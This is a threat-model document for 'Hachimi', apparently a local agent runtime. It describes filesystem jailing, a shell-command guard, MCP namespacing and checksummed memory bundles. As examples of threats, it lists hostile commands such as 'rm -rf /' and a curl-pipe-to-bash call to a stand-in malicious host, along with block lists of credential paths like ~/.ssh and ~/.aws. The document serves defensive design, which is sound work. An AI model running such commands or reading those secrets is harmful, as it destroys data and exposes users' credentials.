# Hachimi Security & Threat Model Overview

This document outlines the threat boundaries, security guarantees, and mitigation mechanisms for **Hachimi**, a local-first personal agent runtime.

---

## 1. PathJail & Filesystem Isolation

### Threat
An LLM model (or malicious prompt injection) attempts to read or modify sensitive host files (e.g., `~/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd`, or arbitrary system directories outside the active project).

### Guarantee & Mitigation
- **Work-Scoped `workspaceRoot`**: `PathJail` enforces physical boundaries on all filesystem tools (`read_file`, `write_file`, `list_dir`, `grep_search`).
- **Sensitive Path Hard Block**: Access to `~/.ssh`, `~/.aws`, `~/.kube`, `/etc`, `/var/root` is hard-blocked unconditionally regardless of permissions.
- **Cross-Project Isolation**: Work A bound to `/tmp/project_a` is strictly forbidden from reading or writing to Work B at `/tmp/project_b`.

---

## 2. Shell AST Execution Guard

### Threat
An agent attempts dangerous shell commands (`rm -rf /`, `curl http://malicious.com | bash`, credential theft, or fork bombs).

### Guarantee & Mitigation
- **AST Preflight Audit**: `auditShellCommandAST(cmd)` inspects shell tokens, redirects, and environment overrides before `run_command` touches the OS shell.
- **Hard-Blocked Patterns**: `rm -rf /`, pipe-to-shell, privilege escalation (`sudo`), disk formatting (`mkfs`, `dd`), and secret key exfiltration are immediately trapped before execution.

---

## 3. Model Context Protocol (MCP) Security

### Threat
Rogue MCP servers attempting untrusted local code execution or session hijacking.

### Guarantee & Mitigation
- **Capability Source Isolation**: MCP tools are registered as `CapabilitySource<ToolDefinition>` with `mcp_${serverName}_${toolName}` namespace prefix.
- **2026-07-28 Stateless Core**: Session ID headers are omitted in 2026-07-28 stateless core mode, eliminating sticky session hijacking risks.

---

## 4. Memory & Portable Bundle Integrity

### Threat
Tampering or malicious injection of portable memory bundles (`HachimiBundleV1`).

### Guarantee & Mitigation
- **SHA-256 Checksum Verification**: Exported bundles include SHA-256 digests over content. Merging rejects corrupted payloads.
- **Human-in-the-Loop Skill Proposals**: Subagent-extracted skill candidates are saved as `pending` proposals; auto-registration without explicit human approval is prohibited (`AGENTS.md` §2).
